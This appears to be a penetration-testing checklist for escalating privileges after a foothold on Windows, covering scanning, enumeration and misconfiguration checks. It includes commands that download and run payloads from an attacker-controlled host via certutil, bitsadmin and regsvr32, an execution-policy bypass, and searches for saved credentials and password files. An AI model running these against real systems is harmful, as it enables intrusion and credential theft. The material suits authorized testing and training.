---
title: Windows Checklist
type: checklist
tab: Checklists
target: Windows
tags: [Windows, Checklist, Enumeration, PrivilegeEscalation]
---

# Windows Checklist

## Goal

Move from Windows foothold to a privilege escalation path by checking service clues, automated enum output, token privileges, services, tasks, registry, and saved credentials.

## Flow

- [ ] Run basic port/service discovery.
- [ ] Check service-specific quick wins such as SNMP or FTP.
- [ ] Run automated enum.
- [ ] Manually review privileges, services, tasks, registry, saved creds, and history.
- [ ] Use LOLBAS only when it helps with download, execution, or bypass.

## Initial Foothold

### Nmap

```sh
# Fast full TCP scan.
nmap -p- --min-rate 1000 -T4 <TARGET_IP> -oN nmap_ports.txt

# Extract ports and run a detailed scan.
ports=$(grep open nmap_ports.txt | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')
nmap -sC -sV -p$ports <TARGET_IP> -oN nmap_detail.txt

# Quick UDP checks.
sudo nmap -sU --top-ports 10 <TARGET_IP>
sudo nmap -sU --top-ports 50 <TARGET_IP>
```

### If Found SNMP

```sh
# Enumerate community strings and basic SNMP data.
onesixtyone -c <COMMUNITY_LIST> <TARGET_IP>
snmp-check -c public <TARGET_IP>
snmpwalk -v2c -c public <TARGET_IP>
```

### If Found FTP

```sh
# Try anonymous/default FTP access.
ftp <TARGET_IP>
# user: ftp
# pass: ftp
```

## Post-Exploitation / Privilege Escalation

### Automated Enum

```powershell
# WinPEAS.
certutil -urlcache -split -f http://<LHOST>/winPEASx64.exe C:\Temp\wp.exe

# PowerUp.
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"

# Seatbelt.
.\Seatbelt.exe -group=all
```

### High-Yield Manual Checks

- [ ] Check `whoami /priv` for `SeImpersonatePrivilege`, then Potato-family attacks.
- [ ] Check unquoted service paths.
- [ ] Check writable service binaries.
- [ ] Check AlwaysInstallElevated registry keys.
- [ ] Check scheduled tasks and writable task paths.
- [ ] Check autorun registry keys.
- [ ] Check `cmdkey /list` and PowerShell history.
- [ ] Search files for passwords and secrets.

```powershell
# Token privileges.
whoami /priv
whoami /all

# Unquoted services.
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
Get-CimInstance Win32_Service | where {$_.PathName -match " "} | select Name,PathName

# Scheduled tasks.
schtasks /query /fo LIST /v
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike "\Microsoft*" }

# AlwaysInstallElevated.
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Saved credentials.
cmdkey /list

# PowerShell history.
type C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

## LOLBAS Quick Reference

```powershell
# Download.
certutil -urlcache -split -f http://<LHOST>/file.exe C:\Temp\file.exe
bitsadmin /transfer job http://<LHOST>/file.exe C:\Temp\file.exe

# Execute.
regsvr32 /s /n /u /i:http://<LHOST>/payload.sct scrobj.dll
wmic process call create "cmd /c whoami > C:\out.txt"
rundll32 shell32.dll,ShellExec_RunDLL cmd.exe
```

## If Stuck

- [ ] Check `net use` for mapped network drives.
- [ ] Check `netstat -ano` for internal-only services on `127.0.0.1`.
- [ ] Check installed software versions.
- [ ] Check DLL hijacking with Procmon or missing DLL paths.
- [ ] Search other users' files with `dir /s /b C:\Users\ 2>nul | findstr /i "pass cred secret"`.
- [ ] Check unattended install files and SYSVOL GPP `cpassword` if domain joined.

## Done When

- You know token privileges, service/task attack surface, registry findings, saved creds, history, and interesting installed software.
- You have at least one concrete privesc hypothesis or a reason to move to credential hunting.
